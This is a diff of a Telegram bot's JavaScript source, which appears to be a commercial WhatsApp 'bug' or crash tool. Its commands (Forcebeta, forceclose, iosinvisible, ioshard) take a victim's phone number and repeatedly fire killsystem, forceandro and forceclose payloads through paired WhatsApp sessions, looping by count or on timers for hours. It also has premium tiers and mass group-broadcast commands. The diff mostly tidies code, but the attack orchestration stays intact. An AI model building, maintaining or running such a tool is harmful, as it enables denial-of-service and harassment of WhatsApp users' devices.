@@ -3268,10 +3155,9 @@ SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -3283,7 +3169,7 @@ SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3299,7 +3185,7 @@ SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
                     await killsystemLogic.killsystem(client, targetJid);
                     sent++;
                 } catch (err) {
-                    console.log(`[killsystem only] error: ${err.message}`);
+                    console.log(`[Forcebeta only] error: ${err.message}`);
                 }
             }, delayMs);
 
@@ -3307,7 +3193,7 @@ SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3322,7 +3208,7 @@ SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
                 try {
                     await killsystemLogic.killsystem(client, targetJid);
                 } catch (err) {
-                    console.log(`[killsystem time] error: ${err.message}`);
+                    console.log(`[Forcebeta time] error: ${err.message}`);
                 }
             }, delayMs);
         }
@@ -3330,7 +3216,7 @@ SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -3340,7 +3226,7 @@ SYLoVe('forceclose', async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -3354,7 +3240,7 @@ SYLoVe('forceclose', async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -3366,27 +3252,23 @@ SYLoVe('forceclose', async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
         });
 
-        const delay = ms => new Promise(res => setTimeout(res, ms));
-
         if (args[2] === 'only') {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
             for (let i = 0; i < count; i++) {
-            
                 await forceandroLogic.forceandro(client, targetJid);
                 await forceandrov2Logic.forceandrov2(client, targetJid);
                 await testlogic.forceclose(client, targetJid);
@@ -3396,7 +3278,7 @@ SYLoVe('forceclose', async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3413,7 +3295,7 @@ SYLoVe('forceclose', async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -3423,7 +3305,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -3437,7 +3319,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: ${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -3449,10 +3331,9 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -3464,7 +3345,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3490,7 +3371,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3514,7 +3395,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -3541,7 +3422,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
                     const uid = user.id || user;
                     await S7.sendMessage(uid, `${broadcastText}`, { parse_mode: 'HTML' });
                     ok++;
-                    await new Promise(resolve => setTimeout(resolve, 80)); 
+                    await new Promise(resolve => setTimeout(resolve, 80));
                 } catch (err) { failed++; }
             }
             S7.editMessageText(
@@ -3552,7 +3433,6 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
                 { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
             );
         });
-        // WA Broadcast via Global Senders (Group + Private support)
 
         SYLoVe(['bcgroup','bcallgroup','wabcall'], async (msg)=>{
             const chatId=msg.chat.id.toString();
@@ -3574,7 +3454,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
             }
             S7.editMessageText(`✅ Broadcast to ${sent} groups done.`,{chat_id:chatId, message_id:status.message_id, parse_mode:'HTML'});
         });
-                
+
         SYLoVe('listprem', async (msg) => {
     const chatId = msg.chat.id.toString();
     const userId = msg.from.id.toString();
@@ -3605,7 +3485,8 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
     S7.sendMessage(chatId, SY_BE_MY_LOVE_YOUR_SABIR7718, {
         parse_mode: 'HTML'
     });
-});        
+});
+
         SYLoVe('listgc', async (msg) => {
     const chatId = msg.chat.id.toString();
     const userId = msg.from.id.toString();
@@ -3656,11 +3537,11 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
 
     if (totalGroups === 0) {
         return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No groups found on your connected numbers.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
-    output = 
+    output =
         `⬣ <b>WHATSAPP GROUPS (${totalGroups} total)</b>\n\n` +
         `📦 <b>Available senders:</b> ${sessions.length} (${canUseGlobal(userId)||isGroupPremium(chatId)?'GLOBAL':'OWN'}) | Total Global: ${getGlobalSenders().length}\n\n` +
         output;
@@ -3675,6 +3556,7 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
 
     S7.sendMessage(chatId, output, { parse_mode: 'HTML' });
 });
+
         SYLoVe('state', (msg) => {
     const chatId = msg.chat.id.toString();
     const userId = msg.from.id.toString();
@@ -3698,11 +3580,10 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
         value === '0'
             ? '<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> State set to FREE MODE (All users allowed)'
             : '🔒 State set to PREMIUM ONLY MODE', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             }
     );
 });
-
 
         SYLoVe('listuser', (msg) => {
         const chatId = msg.chat.id.toString();
@@ -3732,54 +3613,51 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
             }
       });
 
-                S7.on('callback_query', async (query) => {
+        S7.on('callback_query', async (query) => {
             const chatId = query.message.chat.id;
             const messageId = query.message.message_id;
             const data = query.data;
             const userId = query.from.id;
             const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
-    const uptime = getRuntime();
-    const love = userId.toString();
+            const uptime = getRuntime();
+            const love = userId.toString();
             const S7edit = async (text, opts) => {
-        try {
-            await S7.editMessageCaption(text, opts);
-        } catch (captionErr) {
-            try {
-                await S7.editMessageText(text, opts);
-            } catch (textErr) {
-                if (!textErr.message.includes('message is not modified')) {
-                    log('error', 'SYSTEM', textErr.message);
+                try {
+                    await S7.editMessageCaption(text, opts);
+                } catch (captionErr) {
+                    try {
+                        await S7.editMessageText(text, opts);
+                    } catch (textErr) {
+                        if (!textErr.message.includes('message is not modified')) {
+                            log('error', 'SYSTEM', textErr.message);
+                        }
+                    }
                 }
-            }
-        }
-    };
-    S7.answerCallbackQuery(query.id).catch(() => {});
+            };
+            S7.answerCallbackQuery(query.id).catch(() => {});
+
             if (data === 'check_membership') {
                 const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);
-
                 if (isMember) {
                     S7.deleteMessage(chatId, messageId).catch(() => {});
-                    S7.sendMessage(chatId, 
-                        `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, 
+                    S7.sendMessage(chatId,
+                        `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`,
                         { parse_mode: 'HTML' }
                     );
                 } else {
-                    S7.answerCallbackQuery(query.id, { 
-                        text: '❌ You have not joined both the Channel and Group yet!', 
-                        show_alert: true 
+                    S7.answerCallbackQuery(query.id, {
+                        text: '❌ You have not joined both the Channel and Group yet!',
+                        show_alert: true
                     });
                 }
-            };
+            }
 
-
-                        if (data === 'misc_menu') {
-                const chatId = query.message.chat.id;
-                const userId = query.from.id.toString();
-                if (!LoveGlobalState(userId, chatId)) {
-                    return sendSYLove(S7, chatId);
-                }
-                const love = query.from.id.toString();
-                const miscText = MainSYLoVe(name, uptime, love, botConfig.botName, botConfig.ownerContact) + `<b>📊 Misc Menu</b>
+            if (data === 'misc_menu') {
+                const chatId2 = query.message.chat.id;
+                const userId2 = query.from.id.toString();
+                if (!LoveGlobalState(userId2, chatId2)) return sendSYLove(S7, chatId2);
+                const love2 = query.from.id.toString();
+                const miscText = MainSYLoVe(name, uptime, love2, botConfig.botName, botConfig.ownerContact) + `<b>📊 Misc Menu</b>
 
 ➡️ /reqpair number ⚙
 ➡️ /delpair number ⚙
@@ -3800,13 +3678,10 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
 ➡️ /mytoken ⚙
 ➡️ /broadcast ⚙
 ➡️ /state 0 | 1  /global on/off ⚙`;
-                S7edit(miscText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
-            }
-                `;
-                S7edit(miscText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
+                S7edit(miscText, { chat_id: chatId2, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
             }
 
-                        if (data === 'bug_menu') {
+            if (data === 'bug_menu') {
                 const chatId2 = query.message.chat.id;
                 const userId2 = query.from.id.toString();
                 if (!LoveGlobalState(userId2, chatId2)) return sendSYLove(S7, chatId2);
@@ -3834,19 +3709,15 @@ SYLoVe(['iosinvisible', 'ioshard'], async (msg) => {
 <b>💎 SVIP</b> → use Global Sender without pairing
 <b>🏆 Group Premium</b> → bot active in group using global senders`;
                 S7edit(bugText, { chat_id: chatId2, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
-                        }
-                S7edit(bugText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
-                }
-                
-                
-             if (data.startsWith('copy_jid_')) {
-        const jid = data.replace('copy_jid_', '');
-        await S7.answerCallbackQuery(query.id, {
-            text: 'JID copied to clipboard!',
-            show_alert: false
+            }
+
+            if (data.startsWith('copy_jid_')) {
+                await S7.answerCallbackQuery(query.id, {
+                    text: 'JID copied to clipboard!',
+                    show_alert: false
+                });
+            }
         });
-    }
-           });
 
     } catch (err) {
         log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
@@ -3887,4 +3758,4 @@ fs.watchFile(file, () => {
   }
   delete require.cache[file];
   require(file);
-});
+});  
